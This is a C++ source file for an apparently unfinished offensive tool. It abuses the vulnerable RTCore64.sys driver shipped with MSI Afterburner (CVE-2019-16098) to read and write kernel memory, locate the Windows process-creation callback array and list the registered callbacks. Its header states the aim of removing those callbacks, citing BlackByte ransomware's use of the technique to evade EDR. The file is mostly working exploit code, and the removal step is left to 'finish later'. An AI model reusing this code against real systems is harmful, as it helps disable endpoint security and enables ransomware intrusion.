/*
    By: ReverseThrottle @ReverseThrottle
    Identify kernel callbacks and remove them ussing RTCore64.sys vulnerability within MSI Afterburner
    !!Disclaimer I am not an expert and am using resources that I find the information/code 
    !!Disclaimer I present is not new and heavily inspired by my resources that I mention below
    CVE-2019-16098 - https://github.com/Barakat/CVE-2019-16098/blob/master/CVE-2019-16098.cpp - Heavily used code for kernel read/write primitives
    Other resources:
    CheeckyBlinder - https://github.com/br-sn/CheekyBlinder @no bs
    Kernel Ps Callbacks - http://blog.deniable.org/posts/windows-callbacks/ @fdiskyou
    BlackByte Ransomware utilizes techinque - https://www.picussecurity.com/resource/blog/blackbyte-ransomware-bypasses-edr-products-via-rtcore64.sys-abuse

*/



#include <Windows.h>
#include <aclapi.h>
#include <Psapi.h>
#include <cstdio>
#include <iostream>



struct WinVersionOffsets {
    DWORD64 process;
    DWORD64 image;
    DWORD64 thread;
    DWORD64 registry;
};

struct RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
};
static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;


DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);

    return MemoryRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);
}
BYTE ReadMemoryBYTE(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 1, Address) & 0xffffff;
}


WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 2, Address) & 0xffff;
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}


void Log(const char* Message, ...) {
    const auto file = stderr;

    va_list Args;
    va_start(Args, Message);
    std::vfprintf(file, Message, Args);
    std::fputc('\n', file);
    va_end(Args);
}


// Code used from Cheeky Blinder @no bs
DWORD64 Findkrnlbase() {
    DWORD cbNeeded = 0;
    LPVOID drivers[1024];

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        return (DWORD64)drivers[0];
    }

    return NULL;
}


struct Offsets {
    DWORD64 process;
    DWORD64 image;
    DWORD64 thread;
    DWORD64 registry;
};

struct Offsets getVersionOffsets() {
    wchar_t value[255] = { 0x00 };
    DWORD BufferSize = 255;
    RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
    wprintf(L"[+] Windows Version %s Found\n", value);
    auto winVer = _wtoi(value);
    switch (winVer) {
        //case 1903:
    case 1909:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
    case 2004:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
    default:
        wprintf(L"[!] Version Offsets Not Found!\n");

    }

}


DWORD64 GetFunctionAddress(LPCSTR function) {

    DWORD64 Ntoskrnlbaseaddress = Findkrnlbase();
    HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    DWORD64 Offset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, function)) - reinterpret_cast<DWORD64>(Ntoskrnl);
    DWORD64 address = Ntoskrnlbaseaddress + Offset;
    FreeLibrary(Ntoskrnl);
    Log("[+] %s address: %p", function, address);
    return address;

}


DWORD64 PatternSearch(HANDLE Device, DWORD64 start, DWORD64 end, DWORD64 pattern) {
    //searches for a pattern of instructions known to be close to the target array in memory, returns the address. Calling function then does some calculations based on the returned value.
    int range = end - start;

    for (int i = 0; i < range; i++) {
        DWORD64 contents = ReadMemoryDWORD64(Device, start + i);
        if (contents == pattern) {
            //Log("GOLD JERRY GOLD: %p", start+i);
            return start + i;
        }
    }

}


void FindDriver(DWORD64 address) {

    LPVOID drivers[1024];
    DWORD cbNeeded;
    int cDrivers, i;
    DWORD64 diff[3][200];
    TCHAR szDriver[1024];

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        int n = sizeof(drivers) / sizeof(drivers[0]);
        cDrivers = cbNeeded / sizeof(drivers[0]);
        int narrow = 0;
        int c = 0;
        for (i = 0; i < cDrivers; i++) {
            //we add all smaller addresses of drivers to a new array, then grab the closest. Not great, I know...
            if (address > (DWORD64)drivers[i]) {
                diff[0][c] = address;
                diff[1][c] = address - (DWORD64)drivers[i];
                diff[2][c] = (DWORD64)drivers[i];
                c++;
            }
        }
    }
    //cheeky for loop to find the smallest diff. smallest diff should be the diff of DriverBase + Diff == Callback function.
    int k = 0;
    DWORD64 temp = diff[1][0];
    for (k = 0; k < cDrivers; k++) {
        if ((temp > diff[1][k]) && (diff[0][k] == address)) {
            temp = diff[1][k];

        }
    }

    if (GetDeviceDriverBaseName(LPVOID(address - temp), szDriver, sizeof(szDriver))) {
        std::cout << "[+] " << std::hex << address << " [";
        std::wcout << szDriver << " + 0x";
        std::cout << std::hex << (int)temp;
        std::cout << "]" << std::endl;
    }
    else {
        Log("[+] Could not resolve driver for %p", address);
    }
}


int main()
{
    //
    //Determine Windows version
    //
    Offsets offsets = getVersionOffsets();
    //wchar_t value[255] = { 0x00 };
    //DWORD BufferSize = 255;
    //RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
    //wprintf(L"[*] Windows Version %s Found!\n", value);
    //auto winVer = _wtoi(value);
    //switch (winVer)
    //{
    //case 1909:
    //    wprintf(L"\t[*] Offsets have been set for Windows version %s!\n", value);
    //    // Set to WinVersionOffsets values needed for Windows version
    //    break;
    //case 2004:
    //    wprintf(L"\t[*] Offsets have been set for Windows version %s!\n", value);
    //    // Set to WinVersionOffsets values needed for Windows version
    //    break;
    //case 2009:
    //    wprintf(L"\t[*] Offsets have been set for Windows version %s!\n", value);
    //    // Set to WinVersionOffsets values needed for Windows version
    //    break;
    //}

    //
    // Using Windows version information determine required offsets needed
    //
    
    /*
        Finsih later
    */

    
    //
    // Obtain handle to RTCore64.sys 
    //
    HANDLE hRTCore64;
    hRTCore64 = CreateFileW(LR"(\\.\RTCore64)", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hRTCore64 == INVALID_HANDLE_VALUE) {
        Log("[!] Failed to obtain handle to RTCore64...Error Code: %d\nIs driver enabled??", GetLastError());
        getchar();
        return -1;
    }
    Log("[*] RTCore device handle has been obtained: Handle: %p", hRTCore64);
    getchar();

    //
    // Obtain ntoskrnl base address
    //
    const DWORD64 PsSetCreateProcessNotifyRoutineAddress = GetFunctionAddress("PsSetCreateProcessNotifyRoutine");
    const DWORD64 IoCreateDriverAddress = GetFunctionAddress("IoCreateDriver");
    DWORD64 patternaddress = PatternSearch(hRTCore64, PsSetCreateProcessNotifyRoutineAddress, IoCreateDriverAddress, offsets.process);
    DWORD offset = ReadMemoryDWORD(hRTCore64, patternaddress - 0x0c);
    DWORD64 PspCreateProcessNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - 8;
    Log("[+] PspCreateProcessNotifyRoutine: %p", PspCreateProcessNotifyRoutineAddress);
    Log("[+] Enumerating process creation callbacks");
    int i = 0;
    for (i; i < 64; i++) {
        DWORD64 callback = ReadMemoryDWORD64(hRTCore64, PspCreateProcessNotifyRoutineAddress + (i * 8));
        if (callback != NULL) {//only print actual callbacks
            callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes
            DWORD64 cbFunction = ReadMemoryDWORD64(hRTCore64, callback);
            FindDriver(cbFunction);
        }
    }

    //DWORD cbNeeded = 0;
    //LPVOID drivers[1024];
    //DWORD64 NtoskrnlAddress;

    //Log("[*] Attempting to obtain Ntoskrnl base address");
    //if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
    //    NtoskrnlAddress = (DWORD64)drivers[0];
    //    Log("[*] Ntoskrnl base address: %p", NtoskrnlAddress);
    //    getchar();
    //}
    //else {
    //    Log("[!] Failed to obtain Ntoskrnl base address\n Error code: %d", GetLastError());
    //    getchar();
    //    return -1;
    //}

    //
    // Obtain PsSetCreateNotifyRoutine()
    //

    //HMODULE Ntoskrnl;
    //DWORD64 offsetPsSet;
    //DWORD64 addressPsSet;


    //Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    //offsetPsSet = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, "PsSetCreateProcessNotifyRoutine")) - reinterpret_cast<DWORD64>(Ntoskrnl);
    //addressPsSet = NtoskrnlAddress + offsetPsSet;
    //Log("Address of PsSetCreateProcessNotifyRoutine: %p", addressPsSet);
    //FreeLibrary(Ntoskrnl);
    //getchar();

    //
    // Obtain PspSetCreateNotifyROutine()
    //

    //DWORD64 bytes = { 0x1B6E8C2950F };
    //ULONG64 i = 0;
    //DWORD64 content = ReadMemoryDWORD64(hRTCore64, addressPsSet + 10);
    //Log("Print %p", content);
    //Log("Print % p", bytes);
    //if (content == bytes) {
    //    Log("YAY");
    //}
    //Log("%p", content + 3);
    //getchar();

    /*
        Working on getting PspSetCreateProcessNotifyRoutine Address
    */

    
    //
    //Enumerate callback array
    //

}


